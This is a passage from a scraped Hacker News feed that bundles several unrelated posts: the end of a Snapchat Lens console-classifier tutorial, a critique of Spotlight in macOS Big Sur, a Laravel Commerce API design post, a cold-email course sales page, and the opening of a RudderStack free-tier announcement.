https://miro.medium.com/max/1400/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*o0s0XnCBPlMaDZGgSWJ_3Q.png?q=20"></p></div></div></div><figcaption>Figure 8: Download and open the Lens Studio project</figcaption></figure><ul><li id="6e58"><strong>Import the model as an ML Component:</strong> In the left Objects panel of Lens Studio, you will find an object called <code>ML Component</code>. Click on it and import the model from the right panel (left image in <em>Figure 10</em>). Since the model file is already in the project structure, Lens Studio is able to recognize it. I highly recommend changing the threshold (model’s prediction confidence) to something higher than 0.5 in order to avoid false positives — I chose to set it to 0.8. The model’s threshold can be found in the <code>Classification Controller</code> file (Right image in <em>Figure 10</em>).</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*56y47Py2Cr51vbkl.png" width="1600" height="1348" srcset="https://miro.medium.com/max/552/0*56y47Py2Cr51vbkl.png 276w, https://miro.medium.com/max/1104/0*56y47Py2Cr51vbkl.png 552w, https://miro.medium.com/max/1280/0*56y47Py2Cr51vbkl.png 640w, https://miro.medium.com/max/1456/0*56y47Py2Cr51vbkl.png 728w, https://miro.medium.com/max/1632/0*56y47Py2Cr51vbkl.png 816w, https://miro.medium.com/max/1808/0*56y47Py2Cr51vbkl.png 904w, https://miro.medium.com/max/1984/0*56y47Py2Cr51vbkl.png 992w, https://miro.medium.com/max/2000/0*56y47Py2Cr51vbkl.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/0*56y47Py2Cr51vbkl.png?q=20"></p></div></div></div><figcaption>Figure 9: Import the model</figcaption></figure></div></div></div><div><div><ul><li id="ca64"><strong>Change the input Texture:</strong> In the <code>ML Component</code> file, change the input texture to <code>Textures &gt; Device Camera Texture</code>. At this point, the Lens can classify consoles.</li></ul></div></div><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*NHfJVcbjmsUVVRb9JKcdJQ.png" width="3264" height="651" srcset="https://miro.medium.com/max/552/1*NHfJVcbjmsUVVRb9JKcdJQ.png 276w, https://miro.medium.com/max/1104/1*NHfJVcbjmsUVVRb9JKcdJQ.png 552w, https://miro.medium.com/max/1280/1*NHfJVcbjmsUVVRb9JKcdJQ.png 640w, https://miro.medium.com/max/1456/1*NHfJVcbjmsUVVRb9JKcdJQ.png 728w, https://miro.medium.com/max/1632/1*NHfJVcbjmsUVVRb9JKcdJQ.png 816w, https://miro.medium.com/max/1808/1*NHfJVcbjmsUVVRb9JKcdJQ.png 904w, https://miro.medium.com/max/1984/1*NHfJVcbjmsUVVRb9JKcdJQ.png 992w, https://miro.medium.com/max/2160/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1080w, https://miro.medium.com/max/2700/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1350w, https://miro.medium.com/max/3240/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1620w, https://miro.medium.com/max/3780/1*NHfJVcbjmsUVVRb9JKcdJQ.png 1890w, https://miro.medium.com/max/4320/1*NHfJVcbjmsUVVRb9JKcdJQ.png 2160w, https://miro.medium.com/max/4800/1*NHfJVcbjmsUVVRb9JKcdJQ.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*NHfJVcbjmsUVVRb9JKcdJQ.png?q=20"></p></div></div><figcaption>Figure 10: Select the ML Model (Left images), change the Texture (Middle image), and change the model threshold</figcaption></figure></div><div><div><ul><li id="16ef"><strong>Change the script:</strong> In the left <code>Resources</code> panel, you can find a folder called <code>Scripts &gt; Classification Helpers</code> containing all the <code>.js</code> files. We will change the <code>ClassificationExampleHelper</code> file with the following code:</li></ul><figure><div></div></figure><ul><li id="e37c"><strong>Add the images and set up the text colors:</strong> By setting the inputs in the script above, Lens Studio will automatically add a menu where you can upload the Xbox and PS5 banners and set the custom colors for each console.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*Scx4ag9bXE3kEuleoHmRsQ.png" width="2880" height="1706" srcset="https://miro.medium.com/max/552/1*Scx4ag9bXE3kEuleoHmRsQ.png 276w, https://miro.medium.com/max/1104/1*Scx4ag9bXE3kEuleoHmRsQ.png 552w, https://miro.medium.com/max/1280/1*Scx4ag9bXE3kEuleoHmRsQ.png 640w, https://miro.medium.com/max/1456/1*Scx4ag9bXE3kEuleoHmRsQ.png 728w, https://miro.medium.com/max/1632/1*Scx4ag9bXE3kEuleoHmRsQ.png 816w, https://miro.medium.com/max/1808/1*Scx4ag9bXE3kEuleoHmRsQ.png 904w, https://miro.medium.com/max/1984/1*Scx4ag9bXE3kEuleoHmRsQ.png 992w, https://miro.medium.com/max/2000/1*Scx4ag9bXE3kEuleoHmRsQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Scx4ag9bXE3kEuleoHmRsQ.png?q=20"></p></div></div></div><figcaption>Figure 11: Upload the images and set the colors</figcaption></figure></div></div></div></section><section><div><div><p id="e133">While the model was good, I did notice that it has issues classifying PS5, perhaps because it’s hard to differentiate from a white background—but that’s purely speculative since I don’t have much information about the training metrics.</p><p id="aa48">I decided to add more images from <a href="https://www.youtube.com/watch?v=QtMzV73NAgk" rel="noopener">MKBHD’s video</a> of the unboxing of the PS5 and create a much bigger Snapshot of 6,000 images rather than 3,200 images. I also trained the model from the first existing Keras checkpoint, which is basically the first iteration.</p><p id="066e">The model is now much better at classifying the consoles. I have also noticed that when you keep the camera open for more than 30 seconds, the frames drop and the phone (tested on an iPhone X) gets very warm.</p><p id="5747">The project is nowhere near ready to be used by end-users, there are a lot of things that could be added to improve the whole experience in terms of design, or even other elements like music. The possibilities are endless and are likely easy to implement for Snapchat Lens Creators. There is also room to make it even more interesting by adding a class label PC gaming enthusiasts as well!</p></div></div></section><section><div><div><p id="6f00"><em>Editor’s Note:</em><a href="http://heartbeat.fritz.ai/" rel="noopener"><em> </em><strong><em>Heartbeat</em></strong></a><strong><em> </em></strong><em>is a contributor-driven online publication and community dedicated to exploring the emerging intersection of mobile app development and machine learning. We’re committed to supporting and inspiring developers and engineers from all walks of life.</em></p><p id="aa05"><em>Editorially independent, Heartbeat is sponsored and published by</em><a href="http://fritz.ai/" rel="noopener"><em> </em><strong><em>Fritz AI</em></strong></a><em>, the machine learning platform that helps developers teach devices to see, hear, sense, and think. We pay our contributors, and we don’t sell ads.</em></p><p id="8077"><em>If you’d like to contribute, head on over to our</em><a rel="noopener" href="https://heartbeat.fritz.ai/call-for-contributors-october-2018-update-fee7f5b80f3e"><em> </em><strong><em>call for contributors</em></strong></a><em>. You can also sign up to receive our weekly newsletters (</em><a href="https://www.deeplearningweekly.com/" rel="noopener"><strong><em>Deep Learning Weekly</em></strong></a><em> and the </em><a href="https://www.fritz.ai/newsletter/?utm_campaign=fritzai-newsletter&amp;utm_source=heartbeat-statement" rel="noopener"><strong><em>Fritz AI Newsletter</em></strong></a><em>), join us on</em><a href="https://join.slack.com/t/fritz-ai-community/shared_invite/enQtNTY5NDM2MTQwMTgwLWU4ZDEwNTAxYWE2YjIxZDllMTcxMWE4MGFhNDk5Y2QwNTcxYzEyNWZmZWEwMzE4NTFkOWY2NTM0OGQwYjM5Y2U" rel="noopener"><em> </em></a><a href="http://fritz.ai/slack" rel="noopener"><strong><em>Slack</em></strong></a><em>, and follow Fritz AI on</em><a href="https://twitter.com/fritzlabs" rel="noopener"><em> </em><strong><em>Twitter</em></strong></a><em> for all the latest in mobile machine learning.</em></p></div></div></section></div></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070088</guid>
            <pubDate>Thu, 12 Nov 2020 14:19:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotlight Changes in macOS 11 Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069943">thread link</a>) | @brandonhorst
<br/>
November 12, 2020 | https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur | <a href="https://web.archive.org/web/*/https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>macOS 11 Big Sur changed Spotlight to bring it more in line with iPadOS search. These changes are intended to simplify things, but they create inconsistencies that may be confusing both to newcomers and to long-time users.</p>

<p>Ultimately, there are three interconnected changes: <a href="#spotlight-11-hidden-previews">hidden previews</a>, <a href="#spotlight-11-disclosure-indicators">disclosure indicators</a>, and <a href="#spotlight-11-suggestions">suggestions</a>. This post will analyze the changes and provide <a href="#spotlight-11-recommendations">recommendations</a> to help frustrated users.</p>

<p>Of course, I believe that <a href="https://lacona.app/">Lacona</a> is an alternative to Spotlight that is both more usable and more powerful, but I won’t be making comparisons to Lacona in this analysis.</p>



<p>Just as before, you call up Spotlight by pressing <code>⌘+Space</code>, or by clicking the magnifying glass icon in the menu bar. However, things change once you start typing.</p>

<p>In macOS X, Spotlight showed your <em>search results</em> in a list on the left side, with a <em>preview</em> on the right side. In Big Sur, the search results are presented in a single list, with no visible preview.</p>

<p><img src="https://lacona.app/img/posts/spotlight-1.png" alt="Spotlight &quot;app&quot; screenshot"></p>

<p>These previews—which were originally introduced as a headlining feature of macOS 10.10 Yosemite—are not actually gone, just hidden. Clicking on a result, or pressing <code>Tab</code> will show the preview.</p>

<p>It’s clear that hiding the preview is an attempt to make the interface appear simpler and more iOS-like. Indeed, it frees up space; but the new space isn’t actually used for anything. For most queries, this space is left completely empty. What’s worse, this whitespace visually separates the results from the crucial new interface element on the far right side, the <em>disclosure indicator</em>.</p>

<h2 id="spotlight-11-disclosure-indicators">Disclosure Indicators</h2>

<p>Some results have a small iOS-style arrow on the far right side. Apple refers to this arrow as a disclosure indicator. It indicates that pressing <code>Return</code> on this result will not open anything, but will instead display the preview on the right side of the window.</p>

<p>Once the preview is displayed, pressing <code>Return</code> again will open the result, even though the disclosure indicator is still present.</p>

<p><img src="https://lacona.app/img/posts/spotlight-2.png" alt="Spotlight &quot;apple stock&quot; screenshot"></p>

<p>These results can be very useful! However, for the first time in Spotlight’s history, ambiguity is introduced to the <code>Return</code> key. Some may consider this necessary complexity, but it’s not the last inconsistency we’ll see today.</p>

<h2 id="spotlight-11-suggestions">Suggestions</h2>

<p>In addition to showing search results, Spotlight now has an additional unlabeled section which I call <em>suggestions</em>. Directly below the unlabeled “top results” section for any given search, there is a section containing a handful of queries that Spotlight believes you may be typing. Some of these queries show the icon of your default web browser, and others show a Spotlight icon and have a disclosure indicator. The number and order of these results varies, but they could take up as much as 83% of the results “above the fold”.</p>

<p><img src="https://lacona.app/img/posts/spotlight-3.png" alt="Spotlight &quot;apple&quot; screenshot"></p>

<p>These suggestions are based on both “Siri Suggestions” and the files of your Mac. This behavior is interesting, but I can’t say it’s very useful; the files referenced always show up further down on the list.</p>

<p>When selecting one of the results with the web browser icon, Spotlight will search for the query using your default web search engine in your default browser.</p>

<p>When selecting one of the results with the Spotlight icon, your input query will change to the suggestion, and the preview will also be shown.</p>

<h4 id="the-problem-with-suggestions">The Problem with Suggestions</h4>

<p>The most important inconsistencies with these suggestions come when using the mouse. Since the inception of OSX, clicking has meant <em>select</em>. Single-click a file in Finder or a track in Music, and it will be selected. This is how Spotlight used to work, and all non-suggestion results in Spotlight still work this way.</p>

<p>However, for suggestion results, clicking will <em>activate them immediately</em>. This, you may notice, is the way things work on iPadOS. Not only is this inconsistent with macOS in general, it is inconsistent with other results <em>on the very same list</em>. Worse still, because the suggestions section is unlabeled, it becomes harder to figure out exactly what clicking on a result will do.</p>

<p>Even with the keyboard, these suggestions behave completely differently from all other results. I originally tried to write out all different cases, but the inconsistencies are too numerous to list with text. I’ve attached an <a href="#spotlight-11-appendix">appendix</a> enumerating all the cases.</p>

<p>Overall, the suggestions section is Spotlight’s biggest step backward in usability. Its behavior is inconsistent and confusing, it takes up huge portions of the most important result space, and its utility is situational at best. Worst of all, this is the only section which cannot be fully disabled in the Spotlight preferences. <em>You’re stuck with it.</em></p>

<h2 id="spotlight-11-recommendations">Recommendations</h2>

<p>To make your search experience better, here are some recommendations:</p>

<ul>
  <li>Expand the window by dragging from the bottom, so that more results can be displayed.</li>
  <li>Ignore the “suggestions” section and its inconsistent behavior.</li>
  <li>Consider disabling “Siri Suggestions” in the Spotlight preferences, which removes many (but not all) of the suggestions.</li>
  <li>Don’t rely on the mouse for selecting items. Use the <code>⌘+Down</code> and <code>⌘+Up</code> shortcuts to quickly move the selection between entire sections with the keyboard.</li>
  <li>Press <code>Tab</code> whenever you want to see a Preview of the results.</li>
  <li>Consider using a Spotlight alternative with a more considered design.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Spotlight in macOS 11 Big Sur is torn between two between different worlds.</p>

<p>In one dimension, it introduced iOS ideas like disclosure indicators and single-tap actions for its new features. However, it only went half way, leading to an inconsistent and unpredictable experience.</p>

<p>In another dimension, it is trying to introduce AI-powered suggestions to make Spotlight more proactive and Siri-like. However, these suggestions are too constrained by the existing Spotlight interface to be very useful, and take up valuable space that could be used for the more reliable features.</p>

<p>In future releases, I hope that Apple can push Spotlight fully into simplified iOS paradigm, or retreat to the power of macOS. In macOS 11 Big Sur, it tries to straddle the line and fails at both.</p>

<h2 id="spotlight-11-appendix">Appendix: Behavior Changes</h2>

<h4 id="spotlight-behavior-in-macos-1015-catalina-and-prior">Spotlight Behavior in macOS 10.15 Catalina (and Prior)</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Click</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>

<h4 id="spotlight-behavior-in-macos-11-big-sur">Spotlight Behavior in macOS 11 Big Sur</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Tab</th>
      <th>Click (Selected)</th>
      <th>Click (Unselected)</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Web Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show preview</td>
    </tr>
    <tr>
      <td>Result with disclosure indicator</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Previewed result with disclosure indicator</td>
      <td>Open</td>
      <td>None</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Spotlight Completion</td>
      <td>Modify input</td>
      <td>Select input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Browser Completion</td>
      <td>Open</td>
      <td>Select input</td>
      <td>Open</td>
      <td>Open</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>
</div></div>]]>
            </description>
            <link>https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069943</guid>
            <pubDate>Thu, 12 Nov 2020 14:06:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Imagination Driven Development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069916">thread link</a>) | @yiddishe-kop
<br/>
November 12, 2020 | https://blog.yiddishe-kop.com/posts/imagination-driven-development | <a href="https://web.archive.org/web/*/https://blog.yiddishe-kop.com/posts/imagination-driven-development">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>The nice thing about creating your own software from scratch is that you can make it work just like your wildest imaginations. When writing the developer exposed API for the <a href="https://laravel-commerce.yiddishe-kop.com/" rel="noopener noreferrer" target="_blank">Laravel Commerce</a> PHP package, I started by creating the high level methods, in a way that I would want them to look. I wanted the API to be as simple and expressive as possible, so it's a pleasure to work with. Inspired by Laravel of course 😎 .</p><h2>Laravel Commerce Package</h2><p>After searching for a simple ecommerce package for Laravel and not finding a lightweight simple to use solution - I decided to attempt to create one myself.</p><p>So where do we start?</p><p>When thinking about ecommerce the first thing that comes to mind is the <strong>cart</strong> (products come first, but is not part of the package, but part of every application itself). So let's imagine how we'd like to be able to interact with the cart. First up - add products to the cart, hmm... I think it couldn’t get simpler than this:</p><pre spellcheck="false">Cart::add($product);
</pre><p>But what if we want to set the quantity to add? 🤔 This looks nice:</p><pre spellcheck="false">Cart::add($product, <span>int</span> $quantity);
</pre><p>It would be nice to be able to remove a product from the cart as well...</p><pre spellcheck="false">Cart::remove($product);
</pre><p>Wouldn't it be nice to be able to empty the whole cart in one go?</p><pre spellcheck="false">Cart::empty(); 
</pre><p>At checkout we need a way to calculate the totals (tax, shipping, coupons etc):</p><pre spellcheck="false">Cart::calculateTotals();
</pre><h2>Implementing the Logic</h2><p>Once I was happy with the surface API, and we could do everything we'd need to to interact with the cart, now comes the task of actually making this imaginary API actually work! 😀</p><p>So now we get into the weeds of creating the DB table for the cart &amp; cart-items, getting an instance of a cart, storing the cart in the session (so guests can also have a cart) and dealing with all the edge cases. We'll get stuck in deep rabbit holes, but when we come out, our surface API will still be as beautiful as they were in our imagination, because we wrote that before going into the implementation. We made the implementation fit to our API, and not the other way around 👌.</p><h3>Takeaway</h3><p>I learnt a new way of developing software - start with the outside shell, make it look like your best dream, then implement the logic to get it to work. It's like designing the exterior of a car to your imagination, then building the engines to fit.</p><div contenteditable="false" data-layout="default"><p><img alt="Laravel Commerce" src="https://blog.yiddishe-kop.com/storage/canvas/images/G3Px9ZgxGE5BBGc6R2hiAJOPhfMShMk469N1lvgP.png"></p><p>Laravel Commerce</p></div><p>The above packages development is well underway, and is open-source on <a href="https://github.com/Yiddishe-Kop/laravel-commerce" rel="noopener noreferrer" target="_blank">GitHub</a>, and there's really nice <a href="https://laravel-commerce.yiddishe-kop.com/" rel="noopener noreferrer" target="_blank">documentation</a> too!</p>
      </div></div>]]>
            </description>
            <link>https://blog.yiddishe-kop.com/posts/imagination-driven-development</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069916</guid>
            <pubDate>Thu, 12 Nov 2020 14:03:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cold Email for Interesting People]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25069895">thread link</a>) | @philipkiely
<br/>
November 12, 2020 | https://philipkiely.com/cefip/ | <a href="https://web.archive.org/web/*/https://philipkiely.com/cefip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
    <!--Intro-->
    <div>
        <p><img src="https://philipkiely.com/assets/img/cefip_hero_vertical.jpg" alt="Cold Email for Interesting People">
        </p>
    </div>
    <div>
        <h2>Cold Email for Interesting People</h2>
        <p>Whether you want a new job, to meet your heroes, a feature on someone's show, or a unique opportunity that the public doesn't know about, the best way to get it is simple: just ask for what you want. I built an international career from the middle of Iowa, thousands miles away from the action. If you're like me and don't have tons of connections, you'll need to cold-contact people who you've never met to get things started. This course equips you with specific tactics for writing successful cold emails and encourages you to take your shot.</p>
        <br>
        <h5>Video Introduction</h5>
        <p>In a short video, I discuss fundamental concepts relating to cold email including social proof, overcoming
            objections, and formulating a specific ask. <i>16 Minutes</i>.</p>
        <br>
        <h5>Handbook</h5>
        <p>The handbook walks step-by-step through the process of deciding to write a cold email, figuring out who to email, finding their contact information, writing a compelling first message, and closing the conversation. <i>31 Pages</i>.</p>
        <br>
        <h5>Six Annotated Examples</h5>
        <p>Go behind the scenes of my cold email success. I've annotated six examples from the past two years to share with you. Each example includes one or two emails, the context, and the
        payoff. For each email, I go through line-by-line and discuss the impact of the words and phrases. <i>48 Pages</i>.</p>
        <br>
    </div>
</div>
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Sahil Lavingia: "Cold emails work, when they're sent by interesting people."</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on Gumroad</a>
            </p></div>
        </div>
    </div>
    <div>
        <blockquote data-theme="dark">
            <p lang="en" dir="ltr">Cold emails work, when they're sent by interesting people.</p>— Sahil (@shl) <a href="https://twitter.com/shl/status/1306575128277299201?ref_src=twsrc%5Etfw">September 17, 2020</a>
        </blockquote>
        
    </div>
</div>
<hr>
<!--ATA SECTION-->
<div>
    
    <div>
        <p><img src="https://philipkiely.com/assets/img/SeatedPortraitCropped.jpg" alt="Philip Kiely">
        </p>
    </div>
    <div>
        <div>
            <p>Hi, I'm Philip Kiely. I run <a href="https://pkandc.com/">Philip Kiely &amp; Company</a>, which means that I am many
                things to many people. Most often, I’m <a href="https://philipkiely.com/essays/gumroad_hom.html">running marketing</a> at <a href="https://gumroad.com/">Gumroad</a>, selling copies of <a href="https://philipkiely.com/wfsd">Writing for Software Developers</a>,
                working on the next big thing, fixing bugs of my own creation, finding and delighting clients, or running payroll
                through Venmo like a Real Business Person.</p>
            <p>You can find me around the internet, especially <a href="https://twitter.com/philip_kiely">Twitter</a>, <a href="https://news.ycombinator.com/user?id=philipkiely">Hacker News</a>, or <a href="https://www.indiehackers.com/philipkiely">Indie Hackers</a>. I write <a href="https://philipkiely.com/essays">essays</a>, <a href="https://philipkiely.com/essays">tutorials</a>, and <a href="https://philipkiely.com/notes">notes</a> on my own site and <a href="https://philipkiely.com/notes/posts.html">various other publications</a>. You may have heard me on <a href="https://www.se-radio.net/2020/09/episode-426-philip-kiely-on-writing-for-software-developers/">IEEE’s
                    Software Engineering Radio</a> or <a href="https://philipkiely.com/notes/appearances.html">another show</a>. My professional hobbies
                include appearing on podcasts and panels, sending cold emails, pretending that I can read a 10-K, and tweeting
                about business. I also enjoy playing D&amp;D, practicing martial arts, and reading whatever is nearby.</p>
        </div>
    </div>
</div>
<hr>
<!--FAQ SECTION-->
<div>
    <div>
        
        <h5>What is a cold email?</h5>
        <p>A cold email is sending an email to someone who you do not know, or do not know well. The "cold" in cold email doesn't
        refer to the tone (which should generally be warm, friendly, and professional), but rather to the lack of previous
        relationship.</p>
        <br>
        <h5>Am I an interesting person?</h5>
        <p>I think so! Whether or not someone is interesting is quite situational. For example, Tom Brady wouldn't be interested in
        hearing from me with ideas for plays to run, but a developer advocate might be interested in hearing from me with ideas
        for technical content. Being interesting isn't so much an attribute but an action, so anyone can be interesting to the right person in the right situation!</p>
        <br>
        <h5>Who is this course not for?</h5>
        <p>This isn't a course about copywriting for mass emails or other bulk outreach. It isn't about generating leads or making
        tons of LinkedIn connections with some boilerplate message. It is about thinking deeply about how to connect with
        individuals about mutually interesting things.</p>
        <br>
    </div>
    <div>
        <h5>How much should I pay?</h5>
        <p><i>Cold Email for Interesting People</i> is a pay-what-you-want product. You can pay any amount, even zero dollars, but I'd appreciate it if you paid for the product for both of our benefits. Paying for the product helps me run my business and makes you more invested in the content. You can also download for free, see if you like it, and then buy it again if you found it valuable.</p>
        <p>I did pay-what-you-want without a minimum to achieve <a href="https://en.wikipedia.org/wiki/Price_discrimination#First_degree">perfect price discrimination</a> and avoid <a href="https://en.wikipedia.org/wiki/Anchoring_(cognitive_bias)">price anchoring</a>. But, if you really want guidance, let's say that if twenty bucks isn't a big deal for you, you should pay about that much, but if twenty bucks is a big deal for you, you should pay five or grab it for free and not feel bad either way. If you know me personally, you get it for free.</p>
        <br>
        <h5>Is there a refund policy?</h5>
        <p>I have a 30-day no-questions-asked refund policy. If you don't like your purchase, let me know and I will refund your
            money. Because the product is pay-what-you-want, if you think you'd ask for a refund, I'd rather you just download for free because that saves us both time.</p>
        <br>
        <h5>What if I have another question?</h5>
        <p>Send me an email at <a href="mailto:philip@kiely.xyz">philip@kiely.xyz</a>.</p>
        <br>
    </div>
</div>
<!--END FAQ SECTION-->
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Watch the Video Introduction on YouTube</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on
                    Gumroad</a>
            </p></div>
        </div>
    </div>
    <p>
        <iframe width="100%" height="315" src="https://www.youtube.com/embed/E4_WFCF4zLs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    </p>
</div>
<hr>
</div></div>]]>
            </description>
            <link>https://philipkiely.com/cefip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069895</guid>
            <pubDate>Thu, 12 Nov 2020 14:02:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching RudderStack Cloud Free Tier]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069882">thread link</a>) | @soumyadeb
<br/>
November 12, 2020 | https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/ | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                                    <figure>
                        <img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/freetier.blog_.rs_.png" alt="" title="freetier.blog.rs">                    </figure>
                                
                                
                <section>
                    <div>
                        
<p>Today, we launched <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a>, a no time limit, no credit card required, completely free tier of RudderStack Cloud. The driving force behind this is simple: we want you to try RudderStack, and RudderStack Cloud Free makes it easier than ever to do that. You receive the same great experience you get with RudderStack Cloud Pro, with the only limitation being a cap of 500,000 events per month (that’s roughly 10,000 monthly active users for most sites and apps). We are confident that if you try RudderStack, you will find value in it and love it.</p>











<h2>RudderStack’s Warehouse-First Approach is Better Than Other CDPs</h2>











<p>The whole point of your customer data platform (CDP) is to eliminate the customer data silos that are invariably created through your company’s use of a variety of common, popular marketing, sales, and product technologies. Every CDP <em>claims</em> to do this, and modern CDPs, like Segment, actually do this well, but they all have one glaring flaw in their approach. They create another customer data silo, because they store your data. That means you have a third-party data warehouse for your customer data in addition to your own data warehouse, where you store all of your historical data… including another copy of your customer data.</p>



<blockquote><p><strong>RudderStack’s warehouse-first approach fixes this flaw.</strong>&nbsp;</p></blockquote>



<p>RudderStack does not persist any of your customer data. RudderStack builds your CDP on your data warehouse, with support for cloud data warehouses like <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>, <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, and <a href="https://www.snowflake.com/">Snowflake</a>. No more paying your CDP vendor a premium to store your data. No more concerns about whether your CDP vendor is keeping your customer data private and secure. No more crossing your fingers and hoping the BI, ML, or AI tools you already use and love work with your CDP. No more reliance on your CDPs black box for complex functions like identity stitching.</p>











<h2>RudderStack is Built for Developers</h2>











<p>The team that owns your data warehouse and data infrastructure should own your customer data stack too. At pretty much every company, that team primarily consists of developers. So we built RudderStack to be easy to use for devs.</p>



<div><p>RudderStack’s features are built API-first, so they can easily fit into your existing development processes. It offers <a href="https://docs.rudderstack.com/rudderstack-sdk-integration-guides">11 SDKs</a> in addition to <a href="https://docs.rudderstack.com/sources">source integrations</a> with popular cloud-based customer tools including <a href="https://looker.com/">Looker</a> and <a href="https://customer.io/">Customer.io</a>, so you can instrument and start ingesting customer data from all of your digital touchpoints. RudderStack also offers connections to over <a href="https://docs.rudderstack.com/destinations">60 destinations</a>, so you can route your customer data to all of the systems that need it&nbsp; – including popular event-streaming platforms like <a href="https://kafka.apache.org/">Apache Kafka</a>, data warehouses like Snowflake, cloud tools like <a href="https://amplitude.com/">Amplitude</a>, <a href="https://www.appsflyer.com/">AppsFlyer</a>, and many more.</p><p>RudderStack is <a href="https://docs.rudderstack.com/how-to-guides/rudderstack-migration-guide">fully compatible</a> with Segment’s API too. So, if you have already instrumented your digital touchpoints with Segment, you don’t have to go through the toil of reinstrumenting with RudderStack. Just update the configuration on your Segment SDKs and you’re done.</p><p>RudderStack is also open source (visit <a href="https://github.com/rudderlabs">RudderStack on GitHub</a>). So if you ever need to augment or modify your RudderStack, you can, and then, hopefully, you’ll contribute that back to the project, so others benefit from your work too.</p></div>











<h2>Start Building a Better CDP With RudderStack</h2>











